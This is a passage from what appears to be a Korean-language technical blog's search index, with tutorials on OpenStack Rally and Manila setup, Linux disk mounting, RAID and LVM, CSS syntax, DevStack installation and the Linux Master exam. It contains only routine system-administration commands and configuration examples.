/var/log/rally connection = mysql+pymysql://rally:qwer1234@controller/rally $ controller ~(keystone)\u0026gt; mkdir /var/log/rally $ controller ~(keystone)\u0026gt; rally db create # log 파일을 저장할 폴더를 만들고 db를 임포트 시킵니다. $ controller ~(keystone)\u0026gt; rally deployment create --fromenv --name=my_cloud +--------------------------------------+----------------------------+----------+------------------+--------+ | uuid | created_at | name | status | active | +--------------------------------------+----------------------------+----------+------------------+--------+ | 35f9c79c-a47e-49d3-af88-b06b6020b92a | 2020-08-16T09:16:23.793238 | my_cloud | deploy-\u0026gt;finished | | +--------------------------------------+----------------------------+----------+------------------+--------+ $ controller ~(keystone)\u0026gt; source ~/.rally/openrc $ controller ~(keystone)\u0026gt; rally deployment show my_cloud +---------------------------+----------+----------+-------------+-------------+---------------+ | auth_url | username | password | tenant_name | region_name | endpoint_type | +---------------------------+----------+----------+-------------+-------------+---------------+ | http://controller:5000/v3 | admin | *** | admin | | None | +---------------------------+----------+----------+-------------+-------------+---------------+ $ controller ~(keystone)\u0026gt; rally deployment check -------------------------------------------------------------------------------- Platform openstack: -------------------------------------------------------------------------------- Available services: +-------------+----------------+-----------+ | Service | Service Type | Status | +-------------+----------------+-----------+ | __unknown__ | placement | Available | | barbican | key-manager | Available | | cinder | volumev3 | Available | | cloud | cloudformation | Available | | glance | image | Available | | gnocchi | metric | Available | | heat | orchestration | Available | | keystone | identity | Available | | neutron | network | Available | | nova | compute | Available | | swift | object-store | Available | | trove | database | Available | +-------------+----------------+-----------+ $ controller ~(keystone)\u0026gt; vi ~/boot-and-delete.json { \u0026#34;NovaServers.boot_and_delete_server\u0026#34;: [ { \u0026#34;args\u0026#34;: { \u0026#34;flavor\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;m1.small\u0026#34; }, \u0026#34;image\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;Ubuntu1804\u0026#34; }, \u0026#34;force_delete\u0026#34;: false }, \u0026#34;runner\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;constant\u0026#34;, \u0026#34;times\u0026#34;: 10, \u0026#34;concurrency\u0026#34;: 2 }, \u0026#34;context\u0026#34;: {} } ] } $ controller ~(keystone)\u0026gt; rally task start ~/boot-and-delete.json -------------------------------------------------------------------------------- Preparing input task -------------------------------------------------------------------------------- Task is: { \u0026#34;NovaServers.boot_and_delete_server\u0026#34;: [ { \u0026#34;args\u0026#34;: { \u0026#34;flavor\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;m1.small\u0026#34; }, \u0026#34;image\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;Ubuntu1804\u0026#34; }, \u0026#34;force_delete\u0026#34;: false }, \u0026#34;runner\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;constant\u0026#34;, \u0026#34;times\u0026#34;: 10, \u0026#34;concurrency\u0026#34;: 2 }, \u0026#34;context\u0026#34;: {} } ] } Task syntax is correct :) Running Rally version 3.0.0 -------------------------------------------------------------------------------- Task 887a0d20-37ad-4351-aeca-00f646634552: started -------------------------------------------------------------------------------- .... .... -------------------------------------------------------------------------------- Task 887a0d20-37ad-4351-aeca-00f646634552 has 0 error(s) -------------------------------------------------------------------------------- +-----------------------------------------------------------------------------------------------------------------------+ | Response Times (sec) | +--------------------+-----------+--------------+--------------+--------------+-----------+-----------+---------+-------+ | Action | Min (sec) | Median (sec) | 90%ile (sec) | 95%ile (sec) | Max (sec) | Avg (sec) | Success | Count | +--------------------+-----------+--------------+--------------+--------------+-----------+-----------+---------+-------+ | nova.boot_server | 4.466 | 5.409 | 34.472 | 40.002 | 45.533 | 14.471 | 100.0% | 10 | | nova.delete_server | 2.412 | 2.736 | 13.708 | 15.417 | 17.127 | 6.352 | 100.0% | 10 | | total | 6.922 | 12.091 | 40.809 | 44.416 | 48.023 | 20.823 | 100.0% | 10 | | -\u0026gt; duration | 5.922 | 11.091 | 39.809 | 43.416 | 47.023 | 19.823 | 100.0% | 10 | | -\u0026gt; idle_duration | 1.0 | 1.0 | 1.0 | 1.0 | 1.0 | 1.0 | 100.0% | 10 | +--------------------+-----------+--------------+--------------+--------------+-----------+-----------+---------+-------+ Load duration: 108.251619 Full duration: 134.177109 HINTS: * To plot HTML graphics with this data, run: rally task report 887a0d20-37ad-4351-aeca-00f646634552 --out output.html * To generate a JUnit report, run: rally task export 887a0d20-37ad-4351-aeca-00f646634552 --type junit-xml --to output.xml * To get raw JSON output of task results, run: rally task report 887a0d20-37ad-4351-aeca-00f646634552 --json --out output.json   "}),a.add({id:226,href:'/docs/openstack/openstacktraining/openstack-ussuri-16/',title:"OpenStack Ussuri : Manila",content:"OpenStack Ussuri : Manila  ----------------------- ----------------------- ----------------------- | [ Controller Node ] | | [ Compute Node ] | | [ Network Node ] | | | | Libvirt | | Open vSwitch | | MariaDB RabbitMQ | | Nova compute | | L2 Agent | | Memcached Keystone | | Open vSwitch | | L3 Agent | | httpd Cinder API | | L2 Agent | | metadata agent | | Nova-API Compute | | Cinder-LVM | | Swift-proxy | | L2 agent L3 agent | | NFS | | Heat API | | metadata agent | | Manila Share | | API-CFN | | Neutron Server | ----------------------- | Heat Engine | | Gnocchi Trove API | | Designate Services | | Barbican API | ----------------------- | Rally Manila API | -----------------------  OpenStack Ussuri : Manila   Manila는 OpenStack에서 맡는 서비스입니다. Manila의 대한 보다 자세한 설명은 Manila를 참조해주세요.     Manila service 및 User 생성 $ controller ~(keystone)\u0026gt; openstack user create --domain default --project service --password qwer1234 manila +---------------------+----------------------------------+ | Field | Value | +---------------------+----------------------------------+ | default_project_id | b470c69e28db47cdbfc81e06cc67f627 | | domain_id | default | | enabled | True | | id | 4ea7c62d89194d9883e6773a977133b6 | | name | manila | | options | {} | | password_expires_at | None | +---------------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack role add --project service --user manila admin $ controller ~(keystone)\u0026gt; openstack service create --name manila --description \u0026#34;OpenStack Shared Filesystem\u0026#34; share +-------------+----------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | OpenStack Shared Filesystem | | enabled | True | | id | 1129696ac3f5449293b638e0daec3bde | | name | manila | | type | share | +-------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack service create --name manilav2 --description \u0026#34;OpenStack Shared Filesystem V2\u0026#34; sharev2 +-------------+----------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | OpenStack Shared Filesystem V2 | | enabled | True | | id | 1d94787a2d34489dbe880faa5e165e5e | | name | manilav2 | | type | sharev2 | +-------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne share public http://controller:8786/v1/%\\(tenant_id\\)s +--------------+-----------------------------------------+ | Field | Value | +--------------+-----------------------------------------+ | enabled | True | | id | d3d6590a342047eab8abca304701d90d | | interface | public | | region | RegionOne | | region_id | RegionOne | | service_id | 1129696ac3f5449293b638e0daec3bde | | service_name | manila | | service_type | share | | url | http://controller:8786/v1/%(tenant_id)s | +--------------+-----------------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne share internal http://controller:8786/v1/%\\(tenant_id\\)s +--------------+-----------------------------------------+ | Field | Value | +--------------+-----------------------------------------+ | enabled | True | | id | 0a6516d199d346febe62800b87a10eb9 | | interface | internal | | region | RegionOne | | region_id | RegionOne | | service_id | 1129696ac3f5449293b638e0daec3bde | | service_name | manila | | service_type | share | | url | http://controller:8786/v1/%(tenant_id)s | +--------------+-----------------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne share admin http://controller:8786/v1/%\\(tenant_id\\)s +--------------+-----------------------------------------+ | Field | Value | +--------------+-----------------------------------------+ | enabled | True | | id | 6153d88f7eab40caa669c3130f03226a | | interface | admin | | region | RegionOne | | region_id | RegionOne | | service_id | 1129696ac3f5449293b638e0daec3bde | | service_name | manila | | service_type | share | | url | http://controller:8786/v1/%(tenant_id)s | +--------------+-----------------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne sharev2 public http://controller:8786/v2/%\\(tenant_id\\)s +--------------+-----------------------------------------+ | Field | Value | +--------------+-----------------------------------------+ | enabled | True | | id | 22e9d4e2b62a4203ae182041c9c10049 | | interface | public | | region | RegionOne | | region_id | RegionOne | | service_id | 1d94787a2d34489dbe880faa5e165e5e | | service_name | manilav2 | | service_type | sharev2 | | url | http://controller:8786/v2/%(tenant_id)s | +--------------+-----------------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne sharev2 internal http://controller:8786/v2/%\\(tenant_id\\)s +--------------+-----------------------------------------+ | Field | Value | +--------------+-----------------------------------------+ | enabled | True | | id | eb4e0b33fae7432d87078a0ba2c2e8de | | interface | internal | | region | RegionOne | | region_id | RegionOne | | service_id | 1d94787a2d34489dbe880faa5e165e5e | | service_name | manilav2 | | service_type | sharev2 | | url | http://controller:8786/v2/%(tenant_id)s | +--------------+-----------------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne sharev2 admin http://controller:8786/v2/%\\(tenant_id\\)s +--------------+-----------------------------------------+ | Field | Value | +--------------+-----------------------------------------+ | enabled | True | | id | 212c9ddfbc554dfb83f80e3a252db235 | | interface | admin | | region | RegionOne | | region_id | RegionOne | | service_id | 1d94787a2d34489dbe880faa5e165e5e | | service_name | manilav2 | | service_type | sharev2 | | url | http://controller:8786/v2/%(tenant_id)s | +--------------+-----------------------------------------+  Manila 유저의 DB를 생성합니다.  $ controller\u0026gt; mysql -u root -p $ MariaDB\u0026gt; create database manila; $ MariaDB\u0026gt; grant all privileges on manila.* to manila@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; grant all privileges on manila.* to manila@\u0026#39;%\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; flush privileges; $ MariaDB\u0026gt; exit;    controller node manila api 설치  $ controller\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-manila python3-manilaclient # manila 및 관련 모듈을 설치합니다. $ controller\u0026gt; vi /etc/manila/manila.conf [DEFAULT] my_ip = controller api_paste_config = /etc/manila/api-paste.ini rootwrap_config = /etc/manila/rootwrap.conf state_path = /var/lib/manila auth_strategy = keystone default_share_type = default_share_type share_name_template = share-%s transport_url = rabbit://openstack:qwer1234@controller [database] connection = mysql+pymysql://manila:qwer1234@controller/manila [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = manila password = qwer1234 [oslo_concurrency] lock_path = $state_path/tmp $ controller\u0026gt; su -s /bin/bash manila -c \u0026#34;manila-manage db sync\u0026#34; $ controller\u0026gt; systemctl enable --now openstack-manila-api openstack-manila-scheduler $ controller\u0026gt; firewall-cmd --add-port=8786/tcp --permanent $ controller\u0026gt; firewall-cmd --reload # 방화벽을 설정합니다. $ controller ~(keystone)\u0026gt; manila service-list +----+------------------+------------+------+---------+-------+----------------------------+ | Id | Binary | Host | Zone | Status | State | Updated_at | +----+------------------+------------+------+---------+-------+----------------------------+ | 1 | manila-scheduler | controller | nova | enabled | up | 2020-08-21T01:27:53.000000 | +----+------------------+------------+------+---------+-------+----------------------------+ # 확인    compute node manila share 설차  $ compute\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-manila-share python3-manilaclient mariadb-devel python3-devel gcc make $ compute\u0026gt; pip3 install mysqlclient $ compute\u0026gt; vi /etc/manila/manila.conf [DEFAULT] my_ip = compute api_paste_config = /etc/manila/api-paste.ini rootwrap_config = /etc/manila/rootwrap.conf state_path = /var/lib/manila auth_strategy = keystone default_share_type = default_share_type share_name_template = share-%s transport_url = rabbit://openstack:qwer1234@controller [database] connection = mysql+pymysql://manila:qwer1234@controller/manila [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = manila password = qwer1234 [oslo_concurrency] lock_path = $state_path/tmp $ compute\u0026gt; mkdir /var/lib/manila $ compute\u0026gt; chown manila. /var/lib/manila $ compute\u0026gt; firewall-cmd --add-service=nfs --permanent $ compute\u0026gt; firewall-cmd --reload # 새로운 Disk install $ compute\u0026gt; dnf -y install nfs-utils nfs4-acl-tools $ compute\u0026gt; fdisk /dev/sdc ... ... $ compute\u0026gt; pvcreate /dev/sdc1 $ compute\u0026gt; vgcreate manila-volumes /dev/sdc1 $ compute\u0026gt; vi /etc/manila/manila.conf [DEFAULT] enabled_share_backends = lvm [lvm] share_backend_name = LVM share_driver = manila.share.drivers.lvm.LVMShareDriver driver_handles_share_servers = False lvm_share_volume_group = manila-volumes lvm_share_export_ips = compute $ compute\u0026gt; systemctl enable --now openstack-manila-share nfs-server    확인  $ controller ~(keystone)\u0026gt; manila type-create default_share_type False +----------------------+--------------------------------------+ | Property | Value | +----------------------+--------------------------------------+ | ID | 9f6323f6-7443-4a83-ba70-7c10f78366c9 | | Name | default_share_type | | Visibility | public | | is_default | YES | | required_extra_specs | driver_handles_share_servers : False | | optional_extra_specs | | | Description | None | +----------------------+--------------------------------------+ $ controller ~(keystone)\u0026gt; manila type-list +--------------------------------------+--------------------+------------+------------+--------------------------------------+----------------------+-------------+ | ID | Name | visibility | is_default | required_extra_specs | optional_extra_specs | Description | +--------------------------------------+--------------------+------------+------------+--------------------------------------+----------------------+-------------+ | 9f6323f6-7443-4a83-ba70-7c10f78366c9 | default_share_type | public | YES | driver_handles_share_servers : False | | None | +--------------------------------------+--------------------+------------+------------+--------------------------------------+----------------------+-------------+ $ controller ~(keystone)\u0026gt; manila create NFS 10 --name share01 +---------------------------------------+--------------------------------------+ | Property | Value | +---------------------------------------+--------------------------------------+ | id | 72ab96c5-80f5-401a-b414-ab76a240acf1 | | size | 10 | | availability_zone | None | | created_at | 2020-08-21T01:52:16.000000 | | status | creating | | name | share01 | | description | None | | project_id | edd7025c02574d3aa2d3ab6e56208320 | | snapshot_id | None | | share_network_id | None | | share_proto | NFS | | metadata | {} | | share_type | 9f6323f6-7443-4a83-ba70-7c10f78366c9 | | is_public | False | | snapshot_support | False | | task_state | None | | share_type_name | default_share_type | | access_rules_status | active | | replication_type | None | | has_replicas | False | | user_id | 4ebf85318da84b5cb1257152f9fc35ba | | create_share_from_snapshot_support | False | | revert_to_snapshot_support | False | | share_group_id | None | | source_share_group_snapshot_member_id | None | | mount_snapshot_support | False | | progress | None | | share_server_id | None | | host | | +---------------------------------------+--------------------------------------+ $ controller ~(keystone)\u0026gt; manila list $ controller ~(keystone)\u0026gt; manila access-allow share01 ip 1.1.1.0/24 --access-level rw $ controller ~(keystone)\u0026gt; manila access-list share01 $ controller ~(keystone)\u0026gt; openstack server start CentOS_8 $ controller ~(keystone)\u0026gt; manila show share01 | grep path | cut -d\u0026#39;|\u0026#39; -f3 $ controller ~(keystone)\u0026gt; ssh centos@10.0.0.247 $ controller ~(keystone)\u0026gt; sudo mount -t nfs \\ 10.0.0.50:/var/lib/manila/mnt/share-3544d5a3-7157-4c10-aaa3-edd4b6fd2512 /mnt $ controller ~(keystone)\u0026gt; df -hT $ controller ~(keystone)\u0026gt;   "}),a.add({id:227,href:'/docs/system/linux/mount/',title:"Linux Mount",content:"Linux HD Mount   디스크의 구조 1. 물리적 구조\n 스핀들 : 디스크는 하나의 스핀들을 기준으로 여러 개의 플래터로 구성되어 있고 스핀들은 여러 개의 플랫터를 회전시키는 역할을 한다. 플래터 : 플래터는 마그네틱으로 코딩되어져 있고 연속으로 구성되어 있다. 헤더 : 회전중인 플래터에 데이터를 읽거나 쓰기 위해서는 엑세스 암에 부착된 헤더를 이용하여 엑세스 한다.   2. 논리적 구조\n 섹터 : 플래터의 가장 작은 단위, 일반적으로 1섹터의 크기는 512바이트 트랙 : 섹터가 모여 하나의 원을 구성 실린더 : 트랙의 스택 구조 파티션 : MBR의 파티션 테이블(64바이트)에 정보가 저장, 주 파티션 (16바이트, 4개까지 생성이 가능), 확장 파티션 생성이 가능 논리적 구조 크기 비교 : 섹터 \u0026lt; 트랙 \u0026lt; 실린더 \u0026lt; 실린더 그룹 or 파티션 \u0026lt; 디스크   3. 디스크의 종류\n IDE : 과거에 사용하던 방식, 하나의 채널에 여러 개의 장치를 연결 가능, 병렬 SATA : IDE방식에서는 늘어날 수 있는 기기의 한계가 존재하며, 속도도 느리기 때문에 이러한 문제를 해결한 방식, 직렬 SCSI : 서버용으로 사용되는 방식, 데이터 안전성에 집중 및 부가기능 추가 별도으 컨트롤러 필요, 일반적으로 스카시로 읽음, 병렬 SAS : Serial Attached SCSI, scsi 타입의 직렬 연결 버전, 마찬가지로 별도의 컨트롤러 필요, SATA와 SCSI의 장점으로 만들어짐.     Linux HD 추가 $ df -h # 용량 확인 $ fdisk -l # 디스크 확인  VMware에 하드 5G HD2개 추가   $ echo \u0026#34;- - -\u0026#34; \u0026gt; /sys/class/scsi_host/host[ n ]/scan # 디스크 인식  그림과 같이 5G 섹터가 2개 추가됩니다.   $ fdisk [ /dev/sd* ] # 디스크 이름 Command (m for help): n # 새로운 파티션 생성 Command (m for help): p or e # p = 주 파티션, e = 확장 파티션 Command (m for help): number # 파티션 번호 Command (m for help): start sector # 시작 섹터 번호 Command (m for help): partition size # 파티션의 크기 Command (m for help): p # 확인 Command (m for help): w # 저장 Command (m for help): q # 저장하지 않고 종료  파티션을 생성합니다.   $ mkfs /dev/sd* # 생성 파티션 이름 # 디스크 포맷 $ mkfs -t ext4 /dev/sd* # 생성 파티션 이름 # 디스크의 타입을 ext4로 포맷  디스크를 포맷합니다.   $ mkdir disk1 $ mount /dev/sd* disk1 $ mkdir disk2 $ mount /dev/sd* disk2 $ mount $ df -h # 확인  디스크를 마운트 합니다.   $ umount /dev/sd* # 디스크의 마운트를 해제 합니다.       $ vi /etc/fstab [ 장치명 ] [ 마운트 포인트 ] FStype [ 옵션 ] dump fsck  자동 마운트 등록     RAID ( Redundant Array of Inexpensive Disks )  여러 디스크를 논리적으로 묶어 하나의 논리 디스크를 생성하는 것    RAID 종류  0 : 하나의 디스크에 데이터를 기록하면서 동시에 다른 디스크에는 나머지 데이터를 기록하는 방법, 읽기/ 쓰기 속도는 n배, 안정성은 1/n배, FT = 0 1 : 하나의 디스크에 기록되는 모든 데이터가 다른 디스크에 고스란히 복사되는 방법, 읽기, 쓰기 속도는 1배, 안전성은 n배, FT = n-1 2, 3, 4 : 최소 3개의 디스크가 필요하며 2개의 디스크는 raid 0 처럼 구성하고 하나의 디스크는 데이터를 복구하기 위한 패리티 값을 저장, 읽기 쓰기 속도는 n-1배, 안정성 n-2배, FT = 1, 레벨 2, 3, 4마다 각각 데이터 저장 박식이 조금씩 차이가 있다. 5 : 최소 3개의 디스크가 필요하며 2개의 디스크는 raid 0처럼 구성하고 하나의 디스크는 데이터를 복구하기 위한 패리티 값을 저장, 읽기/ 쓰기 속도는 n-1배, 안전성은 n-2배, FT = 1, 레벨 2, 3, 4와는 달리 패리티 값을 여러 디스크에 분산해서 저장 1 + 0 : 2개의 디스크를 먼저 raid 1로 묶고, 묶인 논리 디스크를 다시 raid 0으로 묶는 방법 0 + 1 : 2개의 디스크를 먼저 raid 0로 묶고, 묶인 논리 디스크를 다시 raid 1으로 묶는 방법   madam [ 옵션 ] --create : 생성할 RAID 장치의 이름 --level : RAID 레벨을 지정 --raid--devices : RAID 추가될 실제 장치의 파티션 지정 --detail : 특정 장치의 상세 내역을 출력 # RAID 생성 $ mdadm --manage [ RAID 장치명 ] --add [ 추가할 디스크 파티션 명 ] # 이미 구성되어진 RAID에 디스크 새로 추가 $ madam --stop [ RAID 장치명 ] $ madam --zerosuperblock [ 파티션 장치명 ] # RAID 구성 삭제  RAID 명령어 RAID 생성 후, 다시 포맷, 마운트 작업을 진행해야 됨   $ mdadm --create /dev/md/linear --level linear --raid-devices=2 /dev/sd* /dev/sd* # Linear : 디스크를 배열 형태로 단순하게 연결시킨 구조 $ mdadm --create /dev/md/stripe --level stripe --raid-devices=2 /dev/sd* /dev/sd* # Stripte : 데이터의 내용을 분산 저장하여 속도가 빠르다, 안전성은 낮음  RAID 0 구성   $ mdadm --create /dev/md/mirror --level mirror --raid-devices=2 /dev/sd* /dev/sd* # RAID 1 구성  RAID 1 구성   $ mdadm --create /dev/md/raid5 --level=5 --raid-devices=3 /dev/sdh1 /dev/sdi1 /dev/sdj1 # RAID 5 구성  RAID 5 구성     LVM  위와 같이 파티션만 생성 후 ( 단 생성시 타입을 LVM으로 변경 ( t -\u0026gt; 8e ) )    PV 생성 및 확인  $ pvcreate [ 파티션명 ] # PV 생성 $ pvscan # PV 확인 $ pvdisplay [ 파티션명 ] # PV 확인   VG 생성 및 확인  $ vgcreate [ 볼륨그룹명 ] [ 파티션명1 ] [ 파티션명2 ] [ 파티션명3 ] .... # VG 생성 $ vgscan # VG 확인 $ vgdisplay [ 볼륨그룹명 ] # VG 확인   LV 생성 및 확인  $ lvcreate -L [ 볼륨크기 ] -n [ 볼륨명 ] [ 볼륨그룹명 ] # LV 생성 $ lvscan # LV 확인 $ lvdisplay [ 볼륨명 ] # LV 확인   파일 시스템 적용 후 및 마운트  $ mkfs -t [ 파일 시스템의 타입 ] [ 볼륨 명 ] # 포맷 $ mount [ 볼류 명 ] [ 마운트 포인트 ] # 마운트  상시 적용 또한 /etc/fstab에 수정을 통해 등록이 가능합니다.   "}),a.add({id:228,href:'/docs/system/linux/ls03/',title:"Ls03",content:"****   ****           "}),a.add({id:229,href:'/docs/system/linux/ls04/',title:"Ls04",content:"****   ****           "}),a.add({id:230,href:'/docs/system/linux/ls05/',title:"Ls05",content:"****   ****           "}),a.add({id:231,href:'/docs/system/linux/ls06/',title:"Ls06",content:"****   ****           "}),a.add({id:232,href:'/docs/development/web/css/',title:"CSS 문법",content:" #css\r태그 {\r스타일\r}\r*{\r}\r전체선택\r.클래스명{\r스타일\r}\r\u0026lt;h1 class=\u0026quot;클래스명\u0026quot;\u0026gt;\rid 선택자\r#아이디명{\r스타일\r}\r단위: em, ex, px, pt\rfont-family: \u0026lt;글꼴 이름[,\u0026lt;글꼴 이름\u0026gt;, \u0026lt;글꼴 이름\u0026gt;];\rfont-size: \u0026lt;절대 크기\u0026gt; | \u0026lt;상대 크기\u0026gt; | \u0026lt;크기\u0026gt; | \u0026lt;백분율\u0026gt;\rfont-weight: noraml | bold | bolder | lighter | 100 | 200 ...\rfont-variant: normal | small-caps\rfont-style: normal | italic | oblique\rfont: .....\r#text 스타일\rcolor: \u0026lt;색상\u0026gt;\rrgb(0,200,0). rgba(n,n,n,n), #0000ff, blue\rtext-decoration: none | underline | overline | line-through\rtext-transform: none | capitalize | uppercase | lowercase | full-width\rtext-shadow: none | \u0026lt;가로 거리\u0026gt; \u0026lt;세로 거리\u0026gt; \u0026lt;번짐 정도\u0026gt; \u0026lt;색상\u0026gt;\rwhite-space: normal | nowrap | pre | pre-line | pre-wrap\rletter-spacing: normal | \u0026lt;크기\u0026gt;\rword-spacing: normal | \u0026lt;크기\u0026gt;\r#문단 스타일\rdirection: ltr | rtl\rltr 왼쪽에서 오른쪽으로 표시\rrtl 오른쪽에서 왼쪽으로 표시\rtext-align: start | end | left | right | center | justtify | match-parent\rtext-justfy: auto | none | inter-word | distribute\rtext-indent: \u0026lt;크기\u0026gt; | \u0026lt;백분율\u0026gt; 들여쓰기\rtext-overflow: clip | ellipsis 너치는 텍스트를 자르기 | ...로 표시\rline-height: normal | \u0026lt;숫자\u0026gt; | \u0026lt;크기\u0026gt; | \u0026lt;백분율\u0026gt; | inherit 줄 간격 조절하기\r#리스트\rlist-style-type: 타입\rlist-style-image: url(\u0026lt;이미지\u0026gt;) | none\rlist-style-position: inside | outside 안쪽 들여쓰기 | 비깥 쪽 들여쓰기\r#색\rbackground-color:#000000\rbackground-clip: border-box | padding-box | content-box 박스 외곽까지 적용 | 테두리를 뺸 페딩까지 적용 | 내용부분에만 적용\rbackground-image: url('파일 경로')\rbackground-repeat: repeat | repeat-x | repeat-y | no-repeat 반복 | 가로로 반복 | 세로로 반복 | 반복 x\rbackground-size: auto | contain | cover | \u0026lt;크기 값\u0026gt; | \u0026lt;백분율\u0026gt; 원래 사이즈 | 다 표시되게 | 전체맞춤\rbackground-positon: \u0026lt;수평 위치\u0026gt; \u0026lt;수직 위치\u0026gt;\r수평 위치: left | center | right | \u0026lt;백분율\u0026gt; | \u0026lt;길이 값\u0026gt;\r수직 이치: top | center | bottom | \u0026lt;백분율\u0026gt; | \u0026lt;길이 값\u0026gt;\rbackground-origin: border-box | padding-box | content-box 박스 모델의 가장 외곽인 테두리가 기준 | 패딩 기준 | 내용이 기준\rbackground-attachment: scroll | fixed 화면 스크롤과 함께 배경이미지가 이동 | 이미지 고정\r#그라데이션\rlinear-gradient( \u0026lt;각도\u0026gt; to \u0026lt;방향\u0026gt;, color-stop, [color-stop,..])\rbackground:linear-gradient(to bottom, #06f, white 30%, #06f)\r방향 값: to top | to left | to right | to bottom\rradial-gradient( \u0026lt;최종 모양\u0026gt; \u0026lt;크기\u0026gt; at \u0026lt;위치\u0026gt;, color-stop, [color-stop..])\rbackground radial-gradient(cicrle at 10% 10%, white,blue) background: repeating-linear-gradient(yellow, yellow 20px, red 20px, red40px)\r#박스모델\rwidth: \u0026lt;크기\u0026gt; | \u0026lt;백분율\u0026gt; | auto\rheight: \u0026lt;크기\u0026gt; | \u0026lt;백분율\u0026gt; | auto\rdisplay: none | contents | block | inline | inline-block | table | table-cell\rborder:style: none | hidden | dashed | dotted | double | groove | inset | outset | ridge | solid\r테두리 없음 | 투명 | 점선 | 작은 점선 | 이중선 | 파인 홈 | n | n | n | 실선\rborder-top | right | bottom | left | width -width: \u0026lt;크기\u0026gt; | thin | medium | thick\rborder-radius-top | bottom-left | right-radius: \u0026lt;크기\u0026gt; | \u0026lt;백분율\u0026gt;\rbox-shadow: none | \u0026lt;그림자 값\u0026gt; [, \u0026lt;그림자 값\u0026gt;]*\r\u0026lt;그림자 값\u0026gt; = \u0026lt;수평 거리\u0026gt; \u0026lt;수직 거리\u0026gt; \u0026lt;흐림 정도\u0026gt; \u0026lt;번짐 정도\u0026gt; \u0026lt;색상\u0026gt; inset\rmargin- top | right | bottom | left: \u0026lt;크기\u0026gt; | \u0026lt;백분율\u0026gt; | auto\rmargin: \u0026lt;크기\u0026gt; | \u0026lt;백분율\u0026gt; | auto\rpadding- top | right | bottom | left: \u0026lt;크기\u0026gt; | \u0026lt;백분율\u0026gt; | auto\rpadding: \u0026lt;크기\u0026gt; | \u0026lt;백문율\u0026gt; | auto\rhover{\r마우스가 올라가져 있을 때의 반응\r}\r "}),a.add({id:233,href:'/docs/openstack/openstacktraining/devstack/',title:"DevStack",content:" DevStack Stein 설치  DevStack   Devbian 계열 ( ex : Ubuntu )의 OpenStack 자동화 설치 툴   DevStack 설치   Update Ubuntu System  $ sudo apt -y update $ sudo apt -y upgrade $ sudo apt -y dist-upgrade # Ubuntu의 시스템 및 패키지를 업데이트 합니다. $ sudo init 6 # 시스템을 재시작합니다.     Add Stack User  $ sudo useradd -s /bin/bash -d /opt/stack -m stack # devstack 설치를 위해 stack 유저를 생성합니다. $ echo \u0026#34;stack ALL=(ALL) NOPASSWD: ALL\u0026#34; | sudo tee /etc/sudoers.d/stack # 암호 없이 접근할 권한을 부여합니다.     Download DevStack loacl.conf 파일의 추가적인 설정은 DevStack을 참조해주세요.  $ su - stack $ sudo apt -y install git $ git clone https://git.openstack.org/openstack-dev/devstack # stack user로 진입하여, devstack을 다운받습니다. $ vi local.conf [[local|localrc]] ADMIN_PASSWORD=[ PW ] DATABASE_PASSWORD=$ADMIN_PASSWORD RABBIT_PASSWORD=$ADMIN_PASSWORD SERVICE_PASSWORD=$ADMIN_PASSWORD HOST_IP=[ 현재 호스트의 IP ] # 설치를 위한 설정 파일을 생성합니다. # PW, IP에는 사용자가 원하는 PW, 설치 호스트 네트워크의 IP를 기입합니다.     Start OpenStack Deployment On Ubuntu 18.04 with DevStack  $ cd devstack ./stack.sh     Access OpenStack Dashboard  http://[ HOST IP ]/dashboard로 접속합니다. User Name = admin Password = local.conf의 PW   "}),a.add({id:234,href:'/docs/system/linux/lm-0/',title:"Linux master 개요",content:"Linux master 개요   Linux master    Linux master란 KAIT에서 실시하는 국가공인 자격증 시험으로, 정보통신기술자격검정 시험입니다.\n  기본적으로 Linux 전반에 대한 내용들을 시험보며, 1급, 2급으로 시험이 나누어져 있습니다.\n  자격종류\n 자격구분 : 공인민간자격 등록번호 : 2008-0268 공인번호 : 과학기술정보통신부 제 2018-10호    시험예약 및 기타 자세한 사항은 KAIT Linux master을 확인해주세요.\n     응시료     등급 차수 검정수수료     1급 1차 40.000원     2차 60.000원   2급 1차 15.000원     2차 30.000원       시험과목  1급     2급     시험범위  1급 1차     1급 2차     2급 1차     2급 2차    "}),a.add({id:235,href:'/docs/network/nm/',title:"Network Master",content:"Network Master     Network Master 정리\n  Network Master 필기\n  Network Master 실기\n      "}),a.add({id:236,href:'/docs/system/linux/ls00/',title:"서버환경의 기초",content:"Linux Server Management   서버환경의 기초   네트워크의 정의   정보통신 네트어크 : 가장 바깥 쪽의 네트워크로 메일, WWW 등 다양한 애플리케이션의 네트워크가 정보통신 네트워크를 의미\n  전송 네트워크 : 중간 층의 네트워크로 허브, 라우터와 같은 통신기기 네트워크를 의미\n  통신 회선 네트워크 가장 안쪽이 네트워크로 통신 선로 네트워크로 LAN, WAN, 통신 사업자의 네트워크 서비스 등이 포함\n       이론/ 구현/ 운영   이론 : 연구자를 중심으로 연구 개발되는 이론과 각종 표준화 조직, 단체의 기술 사양을 의미\n  구현 : 이론 기술을 기반으로 제품을 